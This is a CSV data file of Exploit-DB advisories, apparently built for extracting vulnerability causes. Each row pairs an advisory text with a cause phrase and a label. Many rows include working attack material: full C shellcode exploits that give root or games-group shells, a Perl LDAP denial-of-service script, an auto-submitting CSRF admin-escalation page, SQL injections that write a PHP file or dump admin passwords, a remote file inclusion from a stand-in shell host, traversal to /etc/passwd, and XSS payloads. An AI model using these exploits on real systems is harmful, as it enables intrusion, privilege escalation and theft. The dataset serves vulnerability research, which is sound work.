32356,"ZoneAlarm Security Suite 7.0 - AntiVirus Directory Path Buffer Overflow (PoC) source: https://www.securityfocus.com/bid/31124/info  ZoneAlarm Security Suite is prone to a buffer-overflow vulnerability because the application fails to perform adequate boundary checks on user-supplied input when performing virus scans on long directory paths.  Remote attackers may leverage this issue to execute arbitrary code with SYSTEM-level privileges and gain complete access to the vulnerable computer. Failed attacks will cause denial-of-service conditions.  This issue affects ZoneAlarm Security Suite 7.0.483.000; other versions may also be affected.   To demonstrate this issue, construct multiple nested subdirectories, naming the root directory string1 below, and each nested directory string2:  string1: ASCII: ? ? AAAAAAAAAAAAAAAAAAA ? ? AAAAAAAAAAAAAAAAAAA ? ? AAAAAAAAAAAAAAAAAAA ? ? ? AAAAAAAAAAAAAAAAAAA ? ? AAAAAAAAAAAAAAAAAAA ? ? AAAAAAAAAAAAAAAAAAA ? ? ? A ? ? AAAAAAAAAAAAAAAAAAA ? ? AAAAAAAAAAAAAAAAAAA  HEX : b7 20 85 20 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 20 b7 20 85 20 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 20 b7 20 85 20 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 20 b7 20 b7 20 85 20 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 20 b7 20 85 20 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 20 b7 20 85 20 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 20 b7 20 b7 20 85 20 20 41 20 b7 20 85 20 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 20 b7 20 85 20 20 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  string2: ASCII: ???????????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA????AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  HEX: 85 85 85 85 85 85 85 85 85 85 85 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 85 85 85 85 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41",the application fails to perform adequate boundary checks on user-supplied input,1
38519,"Jojo CMS - 'x-forwarded-for' HTTP header SQL Injection source: https://www.securityfocus.com/bid/59934/info  Jojo CMS is prone to an SQL-injection vulnerability because it fails to sanitize user-supplied input.  A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Jojo CMS 1.2 is vulnerable; other versions may also be affected.   POST /articles/test/ HTTP/1.1 X-Forwarded-For: ' OR 1=1 INTO OUTFILE '/var/www/file.php' --  Content-Type: application/x-www-form-urlencoded Content-Length: 88 name=name&email=user%40mail.com&website=&anchortext=&comment=comment&submit=Post+Comment",fails to sanitize user-supplied input,1
33599,"Samba 3.4.5 - Symlink Directory Traversal source: https://www.securityfocus.com/bid/38111/info   Samba is prone to a directory-traversal vulnerability because the application fails to sufficiently sanitize user-supplied input.   Exploits would allow an attacker to access files outside of the Samba user's root directory to obtain sensitive information and perform other attacks.   To exploit this issue, attackers require authenticated access to a writable share. Note that this issue may be exploited through a writable share accessible by guest accounts.   NOTE: The vendor stated that this issue stems from an insecure default configuration. The Samba team advises administrators to set 'wide links = no' in the '[global]' section of 'smb.conf'.   smbclient patch (exploit):  samba-3.4.5/source3/client/client.c /****************************************************************************  UNIX symlink. ****************************************************************************/  static int cmd_symlink(void) {         TALLOC_CTX *ctx = talloc_tos();         char *oldname = NULL;         char *newname = NULL;         char *buf = NULL;         char *buf2 = NULL;         char *targetname = NULL;         struct cli_state *targetcli;          if (!next_token_talloc(ctx, &cmd_ptr,&buf,NULL) ||             !next_token_talloc(ctx, &cmd_ptr,&buf2,NULL)) {                 d_printf(""symlink <oldname> <newname>\n"");                 return 1;         }         oldname = talloc_asprintf(ctx,                         ""%s"", // << HERE modified                         buf);         if (!oldname) {                 return 1;         }         newname = talloc_asprintf(ctx,                         ""%s"", // << HERE modified                         buf2);         if (!newname) {                 return 1;         } /* ORIGINAL SMBCLIENT SOURCE LINES TO BE MODIFIED (SEE ABOVE).       oldname = talloc_asprintf(ctx,                         ""%s%s"", // < modified (see above)                         client_get_cur_dir(), // < removed (see above)                         buf);         if (!oldname) {                 return 1;         }         newname = talloc_asprintf(ctx,                         ""%s%s"", // < modified (see above)                         client_get_cur_dir(), // < removed (see above)                         buf2);         if (!newname) {                 return 1;         } ----------------------------------------------*/          if (!cli_resolve_path(ctx, """", auth_info, cli, oldname, &targetcli, &targetname)) {                 d_printf(""link %s: %s\n"", oldname, cli_errstr(cli));                 return 1;          }          if (!SERVER_HAS_UNIX_CIFS(targetcli)) {                 d_printf(""Server doesn't support UNIX CIFS calls.\n"");                 return 1;         }          if (!cli_unix_symlink(targetcli, targetname, newname)) {                 d_printf(""%s symlinking files (%s -> %s)\n"",                         cli_errstr(targetcli), newname, targetname);                 return 1;         }          return 0; }  // Cheers, // kcope",the application fails to sufficiently sanitize user-supplied input,1
35337,TaskFreak! 0.6.4 - 'print_list.php' Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/46350/info   TaskFreak! is prone to multiple cross-site scripting vulnerabilities because the application fails to sufficiently sanitize user-supplied input.   An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.   TaskFreak! 0.6.4 is vulnerable; other versions may also be affected.   http://taskfreak/print_list.php?dir=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E    http://taskfreak/print_list.php?show=%22%3E%3Cscript%3Ealert%281%29%3C/script%3E,the application fails to sufficiently sanitize user-supplied input,1
29913,Active PHP BookMarks 1.0 - 'APB.php' Remote File Inclusion source: https://www.securityfocus.com/bid/23670/info  Active PHP Bookmarks is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  Active PHP Bookmarks 1.0 is vulnerable; other versions may also be affected.   http://www.example.com/apb.php?APB_SETTINGS['apb_path']=http://shell/,fails to sufficiently sanitize user-supplied data,1
19643,"SCO Unixware 2.1/7.0/7.0.1/7.1/7.1.1 - su(1) Buffer Overflow // source: https://www.securityfocus.com/bid/826/info  Certain versions of Unixware ship with a version of su(1) which is vulnerable to a buffer overflow attack. This attack is possible because su(1) fails to sanity check user supplied data, in this instance a username supplied on the command line. Because su(1) is SUID root this attack may result in root privileges.   // UnixWare7 /usr/bin/su local, K2, revisited Oct-30-1999 #include <unistd.h> #include <stdio.h> #include <stdlib.h> #include <string.h>  char shell[] =  ""\xeb\x48\x9a\xff\xff\xff\xff\x07\xff\xc3\x5e\x31\xc0\x89\x46\xb4""  ""\x88\x46\xb9\x88\x46\x07\x89\x46\x0c\x31\xc0\x50\xb0\x8d\xe8\xdf""  ""\xff\xff\xff\x83\xc4\x04\x31\xc0\x50\xb0\x17\xe8\xd2\xff\xff\xff""  ""\x83\xc4\x04\x31\xc0\x50\x8d\x5e\x08\x53\x8d\x1e\x89\x5e\x08\x53""  ""\xb0\x3b\xe8\xbb\xff\xff\xff\x83\xc4\x0c\xe8\xbb\xff\xff\xff\x2f""  ""\x62\x69\x6e\x2f\x73\x68\xff\xff\xff\xff\xff\xff\xff\xff\xff"";  const char x86_nop=0x90; long nop,esp; long offset=DEFOFF; char buffer[SIZE];  long get_esp() { __asm__(""movl %esp,%eax""); }  int main (int argc, char *argv[]) {     register int i;      if (argc > 1) offset += strtol(argv[1], NULL, 0);     if (argc > 2) nop += strtoul(argv[2], NULL, 0);     else         nop = NOPDEF;     esp = get_esp();      memset(buffer, x86_nop, SIZE);     memcpy(buffer+nop, shell, strlen(shell));      for (i = nop+strlen(shell); i < SIZE-4; i += 4)         *((int *) &buffer[i]) = esp+offset;      printf(""offset = [0x%x]\n"",esp+offset);     execl(""/usr/bin/su"", ""su"", buffer, NULL);      printf(""exec failed!\n"");     return 0; }",su(1) fails to sanity check user supplied data,1
17298,"Novell Netware eDirectory - Denial of Service       nSense Vulnerability Research Security Advisory NSENSE-2011-002       ---------------------------------------------------------------        Affected Vendor:    Novell       Affected Product:   Netware, eDirectory       Platform:           Netware / Linux       Impact:             Remote Denial of Service       Vendor response:    Patch       CVE:                None       Credit:             Knud / nSense        Technical details       ---------------------------------------------------------------       It is possible to cause a Denial of Service in Novell's       LDAP-SSL daemon due to the system blindly allocating a       user-specified amount of memory. Exploiting the issue on a       Netware system will cause a system-wide DoS condition. A script       for replicating the issue is included below:        #!/usr/bin/perl       # usage: ./novell.pl 10.0.0.1 0x41424344       use IO::Socket::SSL;       $socket = new IO::Socket::SSL(Proto=>""tcp"",       PeerAddr=>$ARGV[0], PeerPort=>636);       die ""unable to connect to $host:$port ($!)\n"" unless $socket;       print $socket ""\x30\x84"" . pack(""N"",hex($ARGV[1])) .       ""\x02\x01\x01\x60\x09\x02\x01\x03\x04\x02\x44\x4e\x80\x00"" ;       close $socket; print ""done\n"";         Timeline:       20100819     Contacted vendor, supplied PoC       20100825     Vendor acknowledges receipt of information       20100826     Vendor creates ticket, SR # 10645215982       20100922     nSense requests status update       20100928     Vendor responds that a fix is being tested       20101109     nSense requests status update       20101112     nSense requests status update       20101112     Vendor responds, fix is still being tested       20101221     nSense requests status update       20101227     Vendor responds, patch is being built       20110124     nSense requests status update       20110127     Vendor responds, patches planned for medio feb 2011       20110320     nSense requests status update       20110329     nSense requests status update       20110329     Vendor responds, other issues discovered in code       20110409     Vendor responds, patch issued for eDirectory       20110409     nSense asks for netware patch date       20110419     nSense asks for netware patch date       20110427     nSense asks for netware patch date       20110504     Vendor responds, netware patch released        Solution       Install the vendor supplied patch.       Netware:    http://download.novell.com/Download?buildid=bXPFv5btgsA~       eDirectory: http://download.novell.com/Download?buildid=-KMoN4RVaCQ~        Links:       http://www.nsense.fi                       http://www.nsense.dk          $$s$$$$s.   ,s$$$$s   ,S$$$$$s.  $$s$$$$s.   ,s$$$$s   ,S$$$$$s.       $$$  `$$$  ($$(       $$$  `$$$  $$$  `$$$  ($$(       $$$  `$$$       $$$   $$$    `^$$s.   $$$$$$$$$  $$$   $$$    `^$$s.   $$$$$$$$$       $$$   $$$       )$$)  $$$        $$$   $$$       )$$)  $$$       $$$   $$$  ^$$$$$$7    `7$$$$$P  $$$   $$$  ^$$$$$$7   `7$$$$$P                       D r i v e n   b y   t h e   c h a l l e n g e _",the system blindly allocating a user-specified amount of memory,1
27838,timobraun Dynamic Galerie 1.0 - 'index.php?pfad' Arbitrary Directory Listing source: https://www.securityfocus.com/bid/17896/info  Dynamic Galerie is prone to a directory-traversal vulnerability and a cross-site scripting vulnerability. These issues are due to a failure in the application to properly sanitize user-supplied input.   An attacker can exploit these vulnerabilities to retrieve arbitrary files from the vulnerable system in the context of the affected application or to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/index.php?pfad=/tmp/,a failure in the application to properly sanitize user-supplied input,1
34005,Joomla! Component Percha Downloads Attach 1.1 - 'Controller' Traversal Arbitrary File Access source: https://www.securityfocus.com/bid/40244/info    Multiple Percha components for Joomla are prone to multiple local file-include vulnerabilities because they fail to properly sanitize user-supplied input.    An attacker can exploit these vulnerabilities to obtain potentially sensitive information and execute arbitrary local scripts in the context of the webserver process. This may allow the attacker to compromise the application and the computer; other attacks are also possible.    The following Percha components are affected:    com_perchaimageattach com_perchafieldsattach com_perchadownloadsattach com_perchagallery com_perchacategoriestree   http://www.example.com/index.php?option=com_perchadownloadsattach&controller=../../../../../../../../../../etc/passwd%00,fail to properly sanitize user-supplied input,1
26813,"Jamit Job Board 2.4.1 - 'index.php' SQL Injection source: https://www.securityfocus.com/bid/15848/info  Job Board is prone to an SQL injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in an SQL query.  Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.   http://www.example.com/index.php?cat=[SQL]",a failure in the application to properly sanitize user-supplied input before using it in an SQL query,1
38580,"Microsoft Windows - NtCreateLowBoxToken Handle Capture Local Denial of Service / Privilege Escalation (MS15-111) Source: https://code.google.com/p/google-security-research/issues/detail?id=483  Windows: NtCreateLowBoxToken Handle Capture Local DoS/Elevation of Privilege Platform: Windows 8.1 Update, Windows 10, Windows Server 2012 Class: Local Dos/Elevation of Privilege  Summary: The NtCreateLowBoxToken API allows the capture of arbitrary handles which can lead to to local DoS or elevation of privilege.   Description:  The NtCreateLowBoxToken system call accepts an array of handles which are stored with the new token. This is presumably for maintaining references to the appcontainer specific object directories and symbolic links so that they do not need to be maintained anywhere else. The function, SepReferenceLowBoxObjects which captures the handles has a couple of issues which can lead to abuse:  1) It calls ZwDuplicateObject which means the API can capture kernel handles as well as user handles.  2) No checks are made on what object types the handles represent.   The fact that kernel handles can be captured isn’t as bad as it could be. As far as I can tell there’s no way of getting the handles back. The second issue though is slightly more serious as it allows a user to create a reference cycle to kernel objects and potentially maintain them indefinitely, at least until a reboot.   One way of doing this is to exploit the fact that threads can be assigned impersonation tokens. For example a new thread can be created and the handle to that thread captured inside the lowbox handle table. The resulting lowbox token can then be assigned as an impersonation token, the thread and token now maintain their references and the kernel objects survive the user logging out. As the thread references the process this also maintains the process object.   Now at the point of logging out the process will be terminated but because the token maintains the reference cycle the process object itself will not go away. This can lead to a few results:  1) A user could open handles to important resources and files and prevent the handles getting released. This could ultimately result in a local DoS (although only something like a terminal server would be affected) and the administrator wouldn’t easily be able to fix it without rebooting as the process becomes hidden from typical task managers and trying to terminate it won’t help.  2) If a user logs out then back in again they can reopen the process (by PID or using NtGetNextProcess) and get access to the original process token which is still marked as having the original session ID (something which would normally require TCB privilege to change). This might be exploitable to elevate privileges in some scenarios.  While the session object still exists in the kernel due to the reference cycle, it is dead so trying to create a process within that session will not work, however the user could release the reference cycle by clearing the thread’s impersonation token which will let session object be cleaned up and allow another user (again think terminal server) to login with that session ID. The user could then create a process in that session indirectly by impersonating the token and using something like the task scheduler.   It isn’t immediately clear if the user would be able to access the session’s desktop/window station due to its DACL, but at the least references to the sessions object directory could be maintained (such as DosDevices) which might allow the user to redirect named resources for the user to themselves and get the privileges of the other user. This would be particularly serious if the other user was an administrator.   Proof of Concept:  I’ve provided a PoC which will cause the reference cycle and display the process if it can open one. The archive password is ‘password’. Follow these steps:   1) Extract the PoC to a location on a local hard disk which is writable by a normal user 2) Execute the poc executable file 3) The user should be automatically logged out 4) Log back in as the user 5) Execute poc again, it should now print out information about the stuck process and the extracted process token.   Expected Result: It shouldn’t be possible to generate a kernel object reference cycle  Observed Result: The reference cycle is created and the user can reopen the process.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/38580.zip",the reference cycle,1
37962,"Amateur Photographer's Image Gallery - 'plist.php?albumid' Cross-Site Scripting source: https://www.securityfocus.com/bid/56110/info    Amateur Photographer's Image Gallery is prone to multiple SQL injection vulnerabilities, a cross-site scripting vulnerability, and an arbitrary file-disclosure vulnerability because the application fails to sufficiently sanitize user-supplied data.    An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site, steal cookie-based authentication credentials, compromise the application, access or modify data, exploit latent vulnerabilities in the underlying database, and obtain sensitive information from local files on computers running the vulnerable application.    Amateur Photographer's Image Gallery 0.9a is vulnerable; other versions may also be affected.   http://www.example.com/path_gallery/plist.php?albumid=[XSS]",the application fails to sufficiently sanitize user-supplied data,1
38358,"HP Intelligent Management Center - 'topoContent.jsf' Cross-Site Scripting source: https://www.securityfocus.com/bid/58293/info  HP Intelligent Management Center is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  HP Intelligent Management Center 5.1 E0202 is vulnerable; other versions may also be affected.   http://www.example.com/imc/topo/topoContent.jsf?opentopo_symbolid=""><img src=""http://security.inshell.net/img/logo.png"" onload=alert('XSS');>&opentopo_loader=null&opentopo_level1nodeid=3 &topoorientation_parentsymbolid=null&topoorientation_devsymbolid=null&topoorientation_level1nodeid=null &topoorientation_loader=null&checknode=null&ywkeys=isvlan&ywvalues=1&uselefttree=null&usetabpane=null&HandleMode=null&toponamelist=null",fails to properly sanitize user-supplied input,1
38574,"PHP Server Monitor 3.1.1 - Cross-Site Request Forgery / Privilege Escalation <!-- [+] Credits: hyp3rlinx  [+] Website: hyp3rlinx.altervista.org  [+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-PHPSRVMONITOR-PRIV-ESCALATE.txt   Vendor: ================================ www.phpservermonitor.org sourceforge.net/projects/phpservermon/files/phpservermon/PHP%20Server%20Monitor%20v3.1.1/phpservermon-3.1.1.zip/download   Product: ================================ PHP Server Monitor 3.1.1   Vulnerability Type: ================================= Privilege Escalation / CSRF   Vulnerability Details: =====================  PHP Server Monitor uses level 20 for basic user and level 10 for Admins these are stored in Database. Basic users can elevate thier privileges to that of Administrator by crafting an HTTP payload changing their level to '10' then getting an Administrator to click an infected link or visit a malicious website to launch an CSRF attack which will grant the user admin access. This problem is due to no CSRF protection mechanism in place.    Exploit code(s): ===============  1) privilege escalation / CSRF -->  <!DOCTYPE> <html> <body onLoad=""doit()""> <script> function doit(){ var e=document.getElementById('HELL') e.submit() } </script>  <form id=""HELL"" action=""http://localhost/phpservermon-3.1.1/?&mod=user&action=save&id=3"" method=""post""> <input type=""text"" name=""user_name"" value=""hyp3rlinx"" > <input type=""text"" name=""name"" value=""hyp3rlinx""> <input type=""text"" name=""level"" value=""10""> <input type=""text"" name=""password"" value=""""> <input type=""text"" name=""password_repeat"" value=""""> <input type=""text"" name=""email"" value=""ghostofsin@abyss.com""> <input type=""text"" name=""mobile"" value=""""> <input type=""text"" name=""pushover_key"" value=""""> <input type=""text"" name=""pushover_device"" value=""""> </form>   </body> </html>   <!-- Exploitation Technique: ======================= Remote   Disclosure Timeline: ========================================================= Vendor Notification: NA Oct 30, 2015  : Public Disclosure   Severity Level: ========================================================= High   Description: ==========================================================   Request Method(s):              [+]  POST   Vulnerable Product:             [+]  PHP Server Monitor 3.1.1     ===========================================================  [+] Disclaimer Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author. The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.  by hyp3rlinx -->",no CSRF protection mechanism in place,1
29736,ClipShare 1.5.3 - 'ADODB-Connection.Inc.php' Remote File Inclusion source: https://www.securityfocus.com/bid/22928/info  ClipShare is prone to a remote file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  Exploiting this issue may allow an attacker to compromise the application and the underlying system; other attacks are also possible.  This issue affects version 1.5.3; other versions may also be vulnerable.  http://www.example.com/Path/include/adodb-connection.inc.php?cmd=[Shell-Attack],fails to sufficiently sanitize user-supplied data,1
27921,EVA-Web 2.1.2 - 'rubrique.php3?date' Cross-Site Scripting source: https://www.securityfocus.com/bid/18161/info   EVA-Web is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.    An attacker may leverage these issues to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.   These vulnerabilities are reported to affect versions 2.1.2 and earlier.  http://www.example.com/rubrique.php3?id_rubrique=29&date=[XSS],a failure in the application to properly sanitize user-supplied input,1
27319,Thomson SpeedTouch 500 Series - NewUser Function 31 Variable Persistent User Creation source: https://www.securityfocus.com/bid/16839/info  The SpeedTouch 500 series are prone to a cross-site scripting vulnerability. This issue is due to a failure in the devices to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the compromise of the device.  http://www.exmaple.com/cgi/b/intfs/_intf_/ov/?0=10&1=usrAccApply&34=NewUser&36=1&33=test&31=[code here],a failure in the devices to properly sanitize user-supplied input,1
25937,Plague News System 0.7 - 'delete.php' Access Restriction Bypass source: https://www.securityfocus.com/bid/14139/info  Plague News System is prone to an access restriction bypass vulnerability. The issue exists due to a lack of sanity checks performed by 'delete.php' on deletion requests passed to the script.  A remote attacker may exploit this issue to delete site content and deny service for legitimate users.   http://www.example.com/delete.php?comment=1&id=[ID of comment here] http://www.example.com/delete.php?news=1&id=[ID of news here] http://www.example.com/delete.php?shout=1&id=[ID of shout here],a lack of sanity checks performed by 'delete.php' on deletion requests passed to the script,1
31476,"Efestech E-Kontor - 'id' SQL Injection source: https://www.securityfocus.com/bid/28412/info  Efestech E-Kontor is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   http://www.example.com/?id=-1%20union+select+0,sifre,2,3+from+admin+where+id=1 http://www.example.com/?id=-1%20union+select+0,firma,2,3+from+admin+where+id=1",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
23063,"BSD-Games 2.x - Monop Player Name Local Buffer Overrun (2) // source: https://www.securityfocus.com/bid/8501/info   Monop (included in bsd-games) is prone to a locally exploitable buffer overrun vulnerability. This is due to insufficient bounds checking of player names. Monop is typically installed setgid games, so it is possible to exploit this issue to execute arbitrary code with these privileges.  /* Suse 9.0 /usr/games/monop L0c4l gid=20(games) xploit.  4u7h0r: N4rK07IX => narkotix@linuxmail.org  Bug: 0v3rfl0w in 1. pl4y3r n4m3(07h3rs 4r3 p0ssibl3), 304 byt3s of pl4y3rn4m3 is 3n0ugh for xpl0i747i0n  th4nks 0x7bf2 f0r his suse b0x.  Gr33tZ: mathmonkey,0x7bf2,EFnet,blackhat community,gravi7y,FOZTRK Shou7z:bigmu74n7 4nd his l4m3 cr3w  L4stw0rdz:DreamGod Fazla deil bi kac gun sora remote win2k yi release etcem, scriptkiddy korumali(fazla umutlanma sakin !)           Biliyorum l33t hax0rsun !! O yazdigin remote2k encrypted olarak biz de de var cok heveslenme,sen ve senin 	  elite takiminin yazdigi 100 satir codu ben 15 dakkada yaziyorum o yuzden rakibim deilsiniz,ama sunu da unutmaki,            EFSANELER HIC BIR ZAMAN OLMEZLER !!!!!  */  #include <stdio.h> #include <string.h> #include <unistd.h> #include <sys/wait.h> #include <signal.h> #include <sys/types.h> #include <errno.h> #define BUFFERSIZE 304  #define PATH ""/usr/games/monop"" #define PROG ""monop"" #define ENTER ""\n""  #define NOP  '\220' #define DEC 50 #define RED ""\033[31m"" #define CONSOLE ""\033[0m"" #define BRUTE_START 0xbffff6d0 //play with it  unsigned long getesp() {         __asm__(""movl %esp, %eax""); }     char shellcode[]= // Put h3r3 y0ur sm4r7 sh3llc0d3 /* setregid (20,20) */     ""\x31\xc0\x31\xdb\x31\xc9\xb3\x14\xb1\x14\xb0\x47""     ""\xcd\x80""      /* exec /bin/sh */     ""\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62""     ""\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"";  char  buffer[BUFFERSIZE]; char *pointer;    void vuln_start() { static FILE *lamemono; static char fireupmono[] = ""/usr/games/monop""; static char playernumber[]=""1\n""; static char *playername = buffer;  lamemono = popen(fireupmono,""rw""); if(!popen)  { fprintf(stderr,""[-]%s Could not create file\n"",strerror(errno));    exit(1);  } fprintf(lamemono,""%s"",playernumber); fflush(lamemono);  fprintf(lamemono,""%s"",playername); fflush(lamemono);  fprintf(lamemono,""%s"",ENTER); fflush(lamemono); pclose(lamemono); }   int child_process() { int i; int status; pid_t pid; pid_t waitpid; pid = fork();   if(pid == -1)     { fprintf(stderr,""[-]%s. Fork Failed!\n"",strerror(errno) );       exit(13);     }   else if (pid == 0)     {         vuln_start();           }   else { waitpid = wait(&status);           if(waitpid == -1) 	   { fprintf(stderr,""[-] %s. Wait Failed! \n"",strerror(errno)); 	     return 1; 	   } 	   else if(waitpid != pid) 	   abort(); 	   else               { 	       if(WIFEXITED(status)) 	          { printf(""Child Terminated Normally. Exit Code = %d\n"",WEXITSTATUS(status)); 		    return WEXITSTATUS(status); 		  } 	       else if(WIFSIGNALED(status)) 	          { printf(""Child Terminated Abnormally. Exit Code = %d ""RED""(%s)""CONSOLE""\n"",WTERMSIG(status),strsignal(WTERMSIG(status))); 		    return WTERMSIG(status); 	              if( COREDUMP(status) ) 		        { printf("" Core Dumped,Core File Generated\n""); 			}                     } 	       else{ fprintf(stderr,""[-] Child Stopped\n""); 	            }               }             }      return 1;  } int make_buffer(unsigned long ret) { /*buffer = (char *)malloc(BUFFERSIZE*sizeof(char)); if(!buffer)   {    fprintf(stderr,""[-]malloc() failed. "");    exit(-1);    } */        char l =  (ret & 0x000000ff);    char a =  (ret & 0x0000ff00) >> 8;    char m =  (ret & 0x00ff0000) >> 16;    char e =  (ret & 0xff000000) >> 24;     memset(buffer,NOP,BUFFERSIZE); memcpy(&buffer[BUFFERSIZE-4-strlen(shellcode)],shellcode,strlen(shellcode)); buffer[300] = l; buffer[301] = a; buffer[302] = m; buffer[303] = e; return(0); }  int bruteforce(unsigned long firstret) { long int i; unsigned long found; unsigned long ret; fprintf(stdout,""[+] Bruteforce Starting!!!\n""); for(i = firstret ; i<0 ; i+=DEC)      {      fprintf(stdout,""[+] Testing Ret Address 0x%x\n"",i);      make_buffer(i);      found = child_process();      usleep(999);             if(found == 0)         { printf(""Ret Adress Found = 0x%x\n"",i); 	  break; 	}     }    return(0);  }     void banner(char *argv0) {printf(""Suse 9.0 /usr/games/monop Local Xploit\n"");  printf(""4uth0r: N4rK07IX\n"");  printf(""=> narkotix@linuxmail.org\n"");  printf(""Bruteforce mode=> %s -b\n"",argv0);  printf(""Manuel Ret mode=> %s -a RET\n"",argv0);    }  main(int argc, char *argv[])  {   char *optionlist = ""ba:h:"";   int option;   unsigned long start = BRUTE_START;   unsigned long choose;   int u_r_script_kiddy = 0;   int Opterr = 1;   banner(argv[0]);   if(argc < 2)   fprintf(stderr,""Use -h for help\n"");   while( (option = getopt(argc,argv,optionlist) ) != -1)        switch(option)         {  	  case 'b': 	   u_r_script_kiddy=1; 	   break; 	   	  case 'h': 	   banner(argv[0]); 	   break;  	    	  case 'a':            choose = strtoul(optarg,NULL,0);            make_buffer(choose);            child_process();            exit(0);            break; 	   	  case '?': 	   fprintf(stderr,""Unknown Option use -h for help\n""); 	   banner(argv[0]); 	   exit(-1); 	    	  default: 	   banner(argv[0]); 	   exit(-1); 	}    if(u_r_script_kiddy)      bruteforce(start);       return 0; }",insufficient bounds checking of player names,1
16086,"OpenVAS Manager - Command Injection Source: http://securityreason.com/securityalert/8048  Summary  It has been identified that OpenVAS Manager is vulnerable to command injection due to insufficient validation of user supplied data when processing OMP requests. It has been identified that this vulnerability allows privilege escalation within the OpenVAS Manager but more complex injection may allow  arbitrary code to be executed with the privileges of the OpenVAS Manager on  vulnerable systems. CVE-2011-0018 has been assigned to this vulnerability.  The vulnerable code path is only accessible to authenticated users of OpenVAS Manager however it may also be triggered either directly or by using a cross- site request forgery based attack via the Greenbone Security Assistant web  application.  Current Status  As of the 20th January 2011, the state of the vulnerabilities is believed to be as follows. A patch has been supplied by Greenbone Networks which it successfully resolves this vulnerability. New releases of both 1.0.x and 2.0.x have also been created which incorporate this patch. Note that the cross-site address forgery elements of this vulnerability have not yet been addressed in the Greenbone Security Assistant web application.  Thanks  OpenVAS would like to thank Ronald Kingma and Alexander van Eee of ISSX for  their help in reporting the vulnerability. --  Tim Brown <mailto:timb (at) openvas (dot) org [email concealed]> <http://www.openvas.org/> OpenVAS Security Advisory (OVSA20110118) Date: 18th January 2011 Product: OpenVAS Manager <= 1.0.3 and 2.0rc2 Vendor: OpenVAS <http://www.openvas.org/> Risk: Medium  Summary  It has been identified that OpenVAS Manager is vulnerable to command injection due to insufficient validation of user supplied data when processing OMP requests. It has been identified that this vulnerability allows privilege escalation within the OpenVAS Manager but more complex injection may allow arbitrary code to be executed with the privileges of the OpenVAS Manager on vulnerable systems. CVE-2011-0018 has been assigned to this vulnerability.  The vulnerable code path is only accessible to authenticated users of OpenVAS Manager however it may also be triggered either directly or by using a cross-site request forgery based attack via the Greenbone Security Assistant web application.  Current Status  As of the 20th January 2011, the state of the vulnerabilities is believed to be as follows. A patch has been supplied by Greenbone Networks which it successfully resolves this vulnerability. New releases of both 1.0.x and 2.0.x have also been created which incorporate this patch. Note that the cross-site address forgery 